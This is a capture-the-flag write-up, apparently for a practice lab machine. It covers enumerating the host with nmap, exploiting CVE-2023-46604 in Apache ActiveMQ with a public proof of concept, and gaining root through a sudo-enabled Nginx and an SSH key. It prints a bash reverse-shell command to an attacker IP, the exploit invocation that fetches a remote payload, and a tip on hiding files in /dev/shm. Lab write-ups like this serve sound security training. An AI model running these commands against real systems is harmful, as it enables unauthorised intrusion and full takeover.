# Machine
![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/18c8b00e-0032-4bf8-a5ab-80c613f96fd8)
# Enumeration
We can enumerate the system without employing aggressive vectors.
## Nmap
Nmap command to scan all ports:
<br><br/>
![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/b3fa0def-55f5-474e-a25b-98a54ed7ada7)

Results:

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/6ecff8ab-3d6f-4870-b6b5-958112c4ec7f)
<br><br/>
The scan results reveals that 9 ports are open.
Nmap scan for services and outdated versions for all open ports:

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/09cdb396-4ab5-49fe-920d-4ac76f2e8494)
<br><br/>
Results:
<br><br/>
![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/3a00884f-344d-49c1-86b9-2c1282fffacf)
<br><br/>
The scan reveals Apache ActiveMQ version <strong>5.15.15</strong> running on TCP port 61616

Upon searching for Apache <strong>ActiveMQ version 5.15.15</strong>, it becomes apparent that it is outdated and susceptible to 
vulnerabilities that could potentially lead to Remote Code Execution (RCE).
# Apache ActiveMQ Exploitation
Searching for vulnerabilities in this version of ActiveMQ shows that it is vulnerable to a
deserialisation vulnerability labelled <a href="https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis">CVE-2023-46604</a>

Searching on Google for CVE-2023-46606 exploit github reveals <a href="https://github.com/rootsecdev/CVE-2023-46604">this link</a> which has a Proof of
Concept code for how to exploit it.

## Download and Configure
```
$ wget https://github.com/rootsecdev/CVE-2023-46604/blob/main/poc-linux.xml
$ wget https://github.com/rootsecdev/CVE-2023-46604/blob/main/main.go
```
Download files from github repository
<br><br/>
poc-linux.xml:
![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/344dab13-3c59-404d-93ab-d0bc3af3036e)
<br><br/>
The poc-linux.xml file needs to be edited to specify the target IP address and port.
```
bash -i >& /dev/tcp/10.10.14.145/9001 0>&1
```
The code in the poc-linux.xml file for the backdoor is an HTML entity-encoded version of the following code.
## Running exploit
Our exploit written in go language so we run with this code
```
$ go run main.go
```

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/b6f289d8-c346-4931-95a4-193c6867a3d6)

### With using program manual ###

1. We need to open a Python web server: <br>![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/c21ce5de-e7f3-47eb-b358-049b7e9da051)<br/>
2. We also need to listen with Netcat for a reverse shell: <br>![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/800601ac-7b09-4d1d-b13a-4bc64d8652f9)<br/>


### <strong>Now we can run our exploit!</strong>


```
$ go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.145:8000/poc-linux.xml 
```

Result:

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/d25738b5-5f97-460b-95f4-4b29ef06d42b)

The malicious code has been sent to the server, and we are waiting to connect back.
### Getting Shell
![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/37699978-d2a0-46f9-a7c6-12731e272014)

Finally, we have our shell.

## Privilege Escalation
Now we are a user in the box, but we have to be root!!

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/9ebc7678-f0be-4981-baf2-dbabc704178a)

The following Python command is used to spawn a new interactive shell:
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
And press CTRL+Z to bg the session

```
$ stty raw -echo; fg
```
<strong>We set our shell so now we can start the privesc !</strong>

```
$ sudo -l
```

Result:

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/9e24f9d1-22cb-4036-8724-210694c68b05)

Here, we observe that Nginx can be utilized with sudo without requiring a password.

## Nginx configuration
Let's create an Nginx config file to enable file uploads to any desired location.

```
$ cd /dev/shm
```

To create our configuration file, relocate it to /dev/shm/ in order to minimize attention.

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/2b3d5849-99bb-4d96-8fbb-9969d134fcb3)

This config file provide us to upload files on server where we want.

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/5893057a-2ce0-4d20-816f-18caddbedee0)

Lets set our configure file.

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/577e52b3-6009-4b08-841f-b2a7d8402617)

Here we can see it our port on listening from any ip.

## Root Access via SSH

First, create our own SSH key named "broker".

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/e67f0086-3cad-4779-99ec-91dab9da097a)

Transfer the SSH key to the target system.

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/2bce70d4-b3f1-403a-8641-fbfae867f569)

Connect with ssh-key.

![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/9c31efa4-c9c1-4541-b2b6-7c7289cf7a46)



## Getting root and Flag
![image](https://github.com/AzizhanKaya/projelerim/assets/149832485/a3170d07-059b-4f06-b528-4b5fd4f6a927)

### Here is the flag!!






